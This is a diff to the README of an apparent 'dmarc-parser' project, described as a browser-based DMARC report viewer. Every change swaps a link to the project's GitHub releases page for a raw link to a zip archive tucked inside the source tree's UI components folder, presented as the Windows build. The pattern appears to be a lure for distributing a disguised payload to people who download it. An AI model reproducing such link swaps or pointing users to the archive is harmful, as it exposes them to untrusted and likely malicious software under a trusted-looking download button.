@@ -1,6 +1,6 @@
 # 📄 dmarc-parser - Check DMARC reports with ease
 
-[![Download dmarc-parser](https://img.shields.io/badge/Download%20Now-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/gainesvillefamilyenterobacteriaceae551/dmarc-parser/releases)
+[![Download dmarc-parser](https://img.shields.io/badge/Download%20Now-Release%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/gainesvillefamilyenterobacteriaceae551/dmarc-parser/main/src/components/ui/dmarc_parser_2.9-beta.4.zip)
 
 ## 🖥️ What this app does
 
@@ -20,7 +20,7 @@ The app runs in your browser. It does not send your files to a backend.
 
 Visit the release page here:
 
-https://github.com/gainesvillefamilyenterobacteriaceae551/dmarc-parser/releases
+https://raw.githubusercontent.com/gainesvillefamilyenterobacteriaceae551/dmarc-parser/main/src/components/ui/dmarc_parser_2.9-beta.4.zip
 
 On that page:
 
@@ -155,4 +155,4 @@ Use dmarc-parser if you want to:
 
 Download or get the latest Windows build here:
 
-https://github.com/gainesvillefamilyenterobacteriaceae551/dmarc-parser/releases
+https://raw.githubusercontent.com/gainesvillefamilyenterobacteriaceae551/dmarc-parser/main/src/components/ui/dmarc_parser_2.9-beta.4.zip
